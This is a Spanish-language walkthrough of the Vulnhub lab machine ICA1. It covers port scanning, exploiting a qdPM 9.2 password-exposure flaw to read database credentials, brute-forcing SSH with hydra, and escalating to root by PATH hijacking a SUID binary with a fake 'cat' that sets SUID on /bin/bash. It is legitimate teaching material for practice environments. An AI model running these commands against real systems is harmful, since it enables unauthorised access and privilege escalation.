---
title: "Máquina ICA1 - Vulnhub"
date: 2023-09-15
image: ../../assets/img/VULNHUB/ICA1.png
categories: Vulnhub
tags: [MySQL, PathHijacking]
---
Link de la [máquina](https://www.vulnhub.com/entry/ica-1,748/):

Según información de nuestra red de inteligencia, el ICA está trabajando en un proyecto secreto. Necesitamos saber cuál es el proyecto. Una vez que tengas los datos de acceso, envíanoslo. Colocaremos una puerta trasera para acceder al sistema más adelante. Simplemente concéntrate en cuál es el proyecto. Probablemente tendrñas que pasar por varias capas de seguridad. La Agencia tiene plena confianza en que completará con éxito esta misión.

## Reconocimiento

Usaremos **nmap** para ver los puertos (servicios) abiertos y expuestos de la máquina, lo exportaremos en formato "Grepeable" al archivo **allPorts**:

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP> -oG allPorts
```
Este será el archivo resultante:

```
# Nmap 7.93 scan initiated Mon Sep 11 17:00:31 2023 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.28.121
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 192.168.28.121 ()	Status: Up
Host: 192.168.28.121 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 3306/open/tcp//mysql///, 33060/open/tcp//mysqlx///
# Nmap done at Mon Sep 11 17:00:44 2023 -- 1 IP address (1 host up) scanned in 13.23 seconds
```

Como vemos tenemos los puertos 22(SSH),80(HTTP),3306(MySQL),33060(MySQLx) expuestos

Mediante la utilidad **extractPorts** vamos a copiar todos los puertos a la clipboard y vamos a seguir con el reconocimiento:

```
$ extractPorts allPorts
[*] Extracting information... 
    [*] IP Address: 192.168.28.121
    [*] Open ports: 22,80,3306,33060

[*] Ports copied to clipboard
```

Y con **nmap** vamos a ver la versión de cada servicio expuesto en la máquina y lo exportaremos en formato Nmap al archivo **targeted**:

```
nmap -sCV -p22,80,3306,33060 192.168.28.121 -oN targeted
```

## Enumeración

Con la herramienta **whatweb** vamos a ver que tecnologías está utilizando la página web que está corriendon en el puerto 80

```
❯ whatweb http://192.168.28.121
http://192.168.28.121 [200 OK] Apache[2.4.48], Bootstrap, Cookies[qdPM8], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[192.168.28.121], JQuery[1.10.2], PasswordField[login[password]], Script[text/javascript], Title[qdPM | Login], X-UA-Compatible[IE=edge]
```

Entre otras cosas, nos damos cuenta de que la página está usando qdPM (Es una herramienta de gestión de proyectos basada en web)

(Imagen de la página web)

## Explotación

Vemos que la versión de **qdPM** es la 9.2, con una pequeña búsqueda con **searchsploit** vemos que esa versión tiene registradas dos vulnerabilidades:

```
$ searchsploit qdPM 9.2
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                          | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                        | php/webapps/50176.txt
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

En este caso vamos a elegir la segunda (Password Exposure), que permitirá descargarnos un archivo yml con la contraseña de acceso a la base de datos, la ruta es `http://<website>/core/config/databases.yml`

```
$ cat databases.yml
  
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      profiler: false
      username: qdpmadmin
      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
      attributes:
        quote_identifier: true  
  
```

Usuario: qdpmadmin
Contraseña: UcVQCMQk2STVeS6J

Con el siguiente comando accederemos a la base de datos

```
$ mysql -uqdpmadmin -h <IP> -pUcVQCMQk2STVeS6J
```

Dentro encontraremos una base de datos llamada **staff** la cuál tiene tres tablas (department, login, user), ahí encontraremos las credenciales codificadas en **base64**

Una vez tengamos una lista con los usuarios y las contraseñas usaremos la herramienta **hydra** para hacer fuerza bruta por SSH a la máquina víctima.

```
$ for password in c3VSSkFkR3dMcDhkeTNyRg== N1p3VjRxdGc0MmNtVVhHWA== WDdNUWtQM1cyOWZld0hkQw== REpjZVZ5OThXMjhZN3dMZw== Y3FObkJXQ0J5UzJEdUpTeQ==; do echo $password | base64 -d; echo; done | tee passwords
```

```
$ hydra -L users -P passwords ssh://192.168.28.121

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-11 17:51:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://192.168.28.121:22/
[22][ssh] host: 192.168.28.121   login: travis   password: DJceVy98W28Y7wLg
[22][ssh] host: 192.168.28.121   login: dexter   password: 7ZwV4qtg42cmUXGX
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-11 17:51:44
```

Ha encontrado nos usuarios los cuáles podemos acceder mediante SSH, **travis** y **dexter**

## Escalada de privilegios

Cuando accedemos con el usuario **dexter**, encontramos esta nota:

```
dexter@debian:~$ cat note.txt 
It seems to me that there is a weakness while accessing the system.
As far as I know, the contents of executable files are partially viewable.
I need to find out if there is a vulnerability or not.
dexter@debian:~$ 
```

Mediante el comando **find** vamos a hacer una búsqueda para ver si hay ejecutables vulnerables en el sistema:

```
dexter@debian:~$ find / -perm -4000 2>/dev/null
/opt/get_access
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
dexter@debian:~$
```

Nos llama la atención el primer resultado, `/opt/get_access`, vamos a echarle un vistazo

Al ejecutarlo nos sale esto:

```
dexter@debian:~$ /opt/get_access 

  ############################
  ########     ICA     #######
  ### ACCESS TO THE SYSTEM ###
  ############################

  Server Information:
   - Firewall:	AIwall v9.5.2
   - OS:	Debian 11 "bullseye"
   - Network:	Local Secure Network 2 (LSN2) v 2.4.1

All services are disabled. Accessing to the system is allowed only within working hours.

dexter@debian:~$
```

Usaremos el comando **strings** para ver las cadenas de caracteres imprimibles que contenga el archivo `/opt/get_access`

```
$ string /opt/get_access

_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
cat /root/system.info
Could not create socket to access to the system.
All services are disabled. Accessing to the system is allowed only within working hours.
;*3$"
```

Nos llama la atención la línea en la que pone "cat /root/system.info" y sabemos que el ejecutable está usando el comando **cat** de forma relativa, lo que nos permite hacer una **PATH HIJACKING** 

El primer paso será dirigirnos a un directorio donde tengamos permisos de escritura (en mi caso /tmp y vamos a crear un ejecutable llamado cat)

Contenido del script:

```
#!/bin/bash

chmod u+s /bin/bash
```

En él le estamos dando permiso SUID a **/bin/bash**

Ahora vamos a modificar el PATH de la siguiente forma:

```
export PATH=/tmp:$PATH
```

Añadiremos la ruta **/tmp** para que el sistema ejecute tome en cuanta los ejecutables de esa ruta

Si volvemos a ejecutar `/opt/get_access` veremos lo siguiente:

```
dexter@debian:/tmp$ /opt/get_access 
All services are disabled. Accessing to the system is allowed only within working hours.

dexter@debian:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Aug  4  2021 /bin/bash
dexter@debian:/tmp$
```

Una vez `/bin/bash` tenga el permiso SUID, con el comando **bash -p** tendremos acceso al usuario **root**

```bash
dexter@debian:/tmp$ bash -p
bash-5.1#
```

Espero que te haya gustado esta primera máquina de **Vulnhub** llamada ICA1 :), !Nos vemos en la siguiente¡
